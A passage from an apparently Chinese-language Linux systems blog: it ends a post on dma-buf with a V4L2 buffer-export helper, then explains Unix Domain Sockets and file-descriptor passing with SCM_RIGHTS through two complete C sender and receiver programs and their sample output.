dma_data_direction)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_buf_unmap_attachment</span><span class="params">(struct dma_buf_attachment *, struct sg_table *)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 断开连接 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_buf_detach</span><span class="params">(struct dma_buf *dmabuf,</span></span></span><br><span class="line"><span class="params"><span class="function">                    struct dma_buf_attachment *dmabuf_attach)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_buf_put</span><span class="params">(struct dma_buf *dmabuf)</span></span>; </span><br></pre></td></tr></table></figure>
<p>可以通过如下方式获取文件描述符： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buffer_export</span><span class="params">(<span class="keyword">int</span> v4lfd, <span class="keyword">enum</span> v4l2_buf_type bt, <span class="keyword">int</span> index, <span class="keyword">int</span> *dmafd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">v4l2_exportbuffer</span> <span class="title">expbuf</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;expbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(expbuf));</span><br><span class="line">    expbuf.type = bt;</span><br><span class="line">    expbuf.index = index;</span><br><span class="line">    <span class="comment">// int ioctl(int fd, int request, struct v4l2_exportbuffer *argp);</span></span><br><span class="line">    <span class="keyword">if</span> (ioctl(v4lfd, VIDIOC_EXPBUF, &amp;expbuf) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;VIDIOC_EXPBUF&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *dmafd = expbuf.fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/23/Linux%20UDS%E4%B8%8EFD%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/23/Linux%20UDS%E4%B8%8EFD%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">Linux UDS与FD迁移技术</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-23 00:58:34 / Modified: 01:03:28" itemprop="dateCreated datePublished" datetime="2022-11-23T00:58:34+08:00">2022-11-23</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Unix Domain Sockets</strong></p>
<p>UDS（Unix Domain Sockets）在 Linux 上表现为一个文件，相比较于普通 socket 监听在端口上，一个进程也可以监听在一个 UDS 文件上，比如 <code>/tmp/xjjdog.sock</code></p>
<p>由于通过这个文件进行数据传输，并不需要走网卡等物理设备，所以通过 UDS 传输数据，速度是非常快的</p>
<p>UDS 主要用于同一主机上的进程间通信</p>
<p><strong>Socket 网络通信原理</strong></p>
<p>之前已经分析过了 Socket 的网络通信原理与内核对协议栈的处理</p>
<p>大致的流程如下：</p>
<ul>
<li>驱动通知网卡有一个新的描述符（有一个即将网络包到达网卡）</li>
<li>网卡从 <code>RX ring buffer</code> 中取出描述符，从而获知缓冲区的地址和大小</li>
<li>网卡收到新的数据包</li>
<li>网卡将新数据包直接通过 <code>DMA</code> 写到内核堆中 <code>sk_buffer</code> 结构体里，并使用中断来通知内核<ul>
<li><code>RX ring buffer</code>：网络栈接收数据环形缓存区</li>
<li><code>DMA</code>：Direct Memory Access 直接存储器访问，外部设备不通过CPU而直接与系统内存交换数据的接口技术</li>
</ul>
</li>
<li>内核调用 <code>netif_receive_skb</code> 来处理 <code>sk_buffer</code> 中的数据包</li>
<li>对于网络协议，内核会遍历协议容器 <code>ptype_base</code> 中的所有协议 <code>packet_type</code>，匹配成功后调用 <code>packet_type-&gt;func</code> 完成相应的处理</li>
<li>最后把处理的结果输出到各个目标进程中</li>
</ul>
<p><strong>Socket 本地通信原理</strong></p>
<p>Unix Domain Sockets 也使用了差不多的原理，但差别如下：</p>
<ul>
<li>UDS 不需要 IP:Port，而是通过一个文件名来表示</li>
<li>使用 UDS 时，<code>socket</code> 函数的 <code>domain</code> 参数固定为 AF_UNIX</li>
<li>UDS 中使用 <code>sockaddr_un</code> 来表示 <code>sockaddr</code> 结构体</li>
</ul>
<p>剩下的操作就和 <code>socket</code> 接口的那一套东西一样了</p>
<p><strong>Msg 消息队列</strong></p>
<p>之前也分析过了信息队列的底层实现</p>
<p>消息队列，是消息的链接表，存放在内核中，一个消息队列由一个标识符（即ID）来标识</p>
<ul>
<li>消息队列的标识符 key 键，它的基本类型是 key_t，使用 <code>ftok</code> 函数可以生成一个 key_t</li>
<li>两个无关的进程，可以通过唯一标识符 key 来找到对应的 msg</li>
</ul>
<p><code>msgget</code> 会在内核堆空间中创建一个 <code>msg_queue</code> 结构体，用于表示一个消息队列的头</p>
<p><code>msgsnd</code> 和 <code>msgrcv</code> 都依靠 <code>msg_msg</code> 结构体，用于表示在这个消息队列中的各个消息主体</p>
<p>这两者通过链表相关联：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg_queue -&gt; msg_msg -&gt; msg_msg -&gt; msg_msg ...</span><br></pre></td></tr></table></figure>
<p>但现在我又了解到了信息队列的一个特殊用途：用于传递 Socket 信息</p>
<p><strong>FD 迁移技术</strong></p>
<p>FD 迁移技术可以把一个进程所挂载的连接（socket），转移到另外一个进程之上</p>
<p>主要是通过如下两个系统调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvmsg</span><span class="params">(<span class="keyword">int</span> sockfd, struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssizt_t</span> <span class="title">sendmsg</span><span class="params">(<span class="keyword">int</span> sockfd, struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个两个函数都需要传入一个 <code>sockfd</code>，并依赖 <code>msghdr</code> 结构体来传递信息：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *msg_name;		<span class="comment">/* Address to send to/receive from.  */</span></span><br><span class="line">    <span class="keyword">socklen_t</span> msg_namelen;	<span class="comment">/* Length of address data.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">msg_iov</span>;</span>	<span class="comment">/* Vector of data to send/receive into.  */</span></span><br><span class="line">    <span class="keyword">int</span> msg_iovlen;		<span class="comment">/* Number of elements in the vector.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *msg_control;		<span class="comment">/* Ancillary data (eg BSD filedesc passing). */</span></span><br><span class="line">    <span class="keyword">socklen_t</span> msg_controllen;	<span class="comment">/* Ancillary data buffer length.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> msg_flags;		<span class="comment">/* Flags in received message.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>其中的 <code>msg_control</code> 条目有需要指向 <code>cmsghdr</code> 结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> cmsg_len;		<span class="comment">/* Length of data in cmsg_data plus length</span></span><br><span class="line"><span class="comment">				   of cmsghdr structure.</span></span><br><span class="line"><span class="comment">				   !! The type should be socklen_t but the</span></span><br><span class="line"><span class="comment">				   definition of the kernel is incompatible</span></span><br><span class="line"><span class="comment">				   with this.  */</span></span><br><span class="line">    <span class="keyword">int</span> cmsg_level;		<span class="comment">/* Originating protocol.  */</span></span><br><span class="line">    <span class="keyword">int</span> cmsg_type;		<span class="comment">/* Protocol specific type.  */</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">if</span> __glibc_c99_flexarr_available</span></span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">char</span> __cmsg_data __flexarr; <span class="comment">/* Ancillary data.  */</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>成员变量 <code>cmsg_type</code> 有3个类型：<ul>
<li><code>SCM_RIGHTS</code></li>
<li><code>SCM_CREDENTIALS</code></li>
<li><code>SCM_SECURITY</code></li>
</ul>
</li>
<li>其中，<code>SCM_RIGHTS</code> 就是我们所需要的，它允许我们从一个进程，发送一个文件句柄到另外一个进程</li>
</ul>
<p>因此，依靠 <code>sendmsg</code> 和 <code>recvmsg</code> 两个系统调用就可以实现 FD 句柄的传输</p>
<ul>
<li>依靠 <code>sendmsg</code> 函数，将 FD 句柄发送到另外一个进程</li>
<li>依靠 <code>recvmsg</code> 函数，接收这部分数据，然后将其还原成 <code>cmsghdr</code> 结构体，然后我们就可以从 <code>cmsg_data</code> 中获取句柄列表</li>
<li>其实 FD 句柄在某个进程里只是一个引用，真正的 FD 句柄是放在内核中的，所谓的迁移，只不过是把一个指针，从一个进程中去掉，再加到另外一个进程中罢了</li>
</ul>
<p>测试案例如下：</p>
<ul>
<li>发送 FD 句柄：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> handle_error(msg) do &#123; perror(msg); exit(EXIT_FAILURE); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">send_fd</span><span class="params">(<span class="keyword">int</span> socket, <span class="keyword">int</span> *fds, <span class="keyword">int</span> n)</span>  <span class="comment">// send fd by socket</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[CMSG_SPACE(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>))], dup[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> =</span> &#123; .iov_base = &amp;dup, .iov_len = <span class="keyword">sizeof</span>(dup) &#125;;</span><br><span class="line"></span><br><span class="line">    msg.msg_iov = &amp;io;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">    msg.msg_control = buf;</span><br><span class="line">    msg.msg_controllen = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">    cmsg = CMSG_FIRSTHDR(&amp;msg);</span><br><span class="line">    cmsg-&gt;cmsg_level = SOL_SOCKET;</span><br><span class="line">    cmsg-&gt;cmsg_type = SCM_RIGHTS;</span><br><span class="line">    cmsg-&gt;cmsg_len = CMSG_LEN(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span> ((<span class="keyword">int</span> *) CMSG_DATA(cmsg), fds, n * <span class="keyword">sizeof</span> (<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sendmsg (socket, &amp;msg, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to send message&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sfd, fds[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s &lt;file-name1&gt; &lt;file-name2&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sfd = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sfd == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to create socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_un));</span><br><span class="line">    addr.sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strncpy</span>(addr.sun_path, <span class="string">&quot;/tmp/fd-pass.socket&quot;</span>, <span class="keyword">sizeof</span>(addr.sun_path) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    fds[<span class="number">0</span>] = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fds[<span class="number">0</span>] &lt; <span class="number">0</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to open file 1 for reading&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">fprintf</span> (<span class="built_in">stdout</span>, <span class="string">&quot;Opened fd %d in parent\n&quot;</span>, fds[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    fds[<span class="number">1</span>] = open(argv[<span class="number">2</span>], O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fds[<span class="number">1</span>] &lt; <span class="number">0</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to open file 2 for reading&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">fprintf</span> (<span class="built_in">stdout</span>, <span class="string">&quot;Opened fd %d in parent\n&quot;</span>, fds[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (connect(sfd, (struct sockaddr *) &amp;addr, <span class="keyword">sizeof</span>(struct sockaddr_un)) == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to connect to socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    send_fd (sfd, fds, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>接收 FD 句柄：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> handle_error(msg) do &#123; perror(msg); exit(EXIT_FAILURE); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> * <span class="title">recv_fd</span><span class="params">(<span class="keyword">int</span> socket, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *fds = <span class="built_in">malloc</span> (n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[CMSG_SPACE(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>))], dup[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> =</span> &#123; .iov_base = &amp;dup, .iov_len = <span class="keyword">sizeof</span>(dup) &#125;;</span><br><span class="line"></span><br><span class="line">    msg.msg_iov = &amp;io;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">    msg.msg_control = buf;</span><br><span class="line">    msg.msg_controllen = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (recvmsg (socket, &amp;msg, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to receive message&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cmsg = CMSG_FIRSTHDR(&amp;msg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span> (fds, (<span class="keyword">int</span> *) CMSG_DATA(cmsg), n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fds;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">ssize_t</span> nbytes;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> sfd, cfd, *fds;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line"></span><br><span class="line">    sfd = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sfd == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to create socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlink (<span class="string">&quot;/tmp/fd-pass.socket&quot;</span>) == <span class="number">-1</span> &amp;&amp; errno != ENOENT)</span><br><span class="line">        handle_error (<span class="string">&quot;Removing socket file failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_un));</span><br><span class="line">    addr.sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strncpy</span>(addr.sun_path, <span class="string">&quot;/tmp/fd-pass.socket&quot;</span>, <span class="keyword">sizeof</span>(addr.sun_path) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(sfd, (struct sockaddr *) &amp;addr, <span class="keyword">sizeof</span>(struct sockaddr_un)) == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to bind to socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (listen(sfd, <span class="number">5</span>) == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to listen on socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cfd = accept(sfd, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (cfd == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to accept incoming connection&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fds = recv_fd (cfd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">2</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span> (<span class="built_in">stdout</span>, <span class="string">&quot;Reading from passed fd %d\n&quot;</span>, fds[i]);</span><br><span class="line">        <span class="keyword">while</span> ((nbytes = read(fds[i], buffer, <span class="keyword">sizeof</span>(buffer))) &gt; <span class="number">0</span>)</span><br><span class="line">            write(<span class="number">1</span>, buffer, nbytes);</span><br><span class="line">        *buffer = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (close(cfd) == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to close client socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./send flag flag2</span><br><span class="line">Opened fd <span class="number">4</span> in parent</span><br><span class="line">Opened fd <span class="number">5</span> in parent</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./read           </span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">flag&#123;yhellow&#125;</span><br><span class="line">Reading from passed fd <span class="number">6</span></span><br><span class="line">flag&#123;yhellow&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>send</code> 程序中打开的两个文件 <code>flag flag2</code> 被迁移到了 <code>read</code> 程序中</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
